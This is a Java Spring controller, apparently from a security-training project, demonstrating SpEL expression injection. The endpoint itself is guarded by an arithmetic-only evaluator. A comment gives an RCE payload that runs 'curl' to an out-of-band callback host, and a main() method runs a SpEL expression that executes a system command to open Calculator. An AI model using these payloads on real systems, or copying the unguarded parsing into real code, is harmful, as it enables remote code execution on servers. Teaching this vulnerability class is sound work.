package org.joychou.controller;

import org.joychou.security.ArithmeticEvaluator;
import org.joychou.util.WebUtils;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.math.BigDecimal;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        // The request string is parsed by our own arithmetic evaluator and never reaches the SpEL engine:
        // no calls, type refs (T(..)), variables, beans or constructors can be expressed.
        BigDecimal result = ArithmeticEvaluator.evaluate(expression);
        if (null == result) {
            return "Bad boy. I got u.";
        }
        return WebUtils.escapeHtml(result.toPlainString());
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

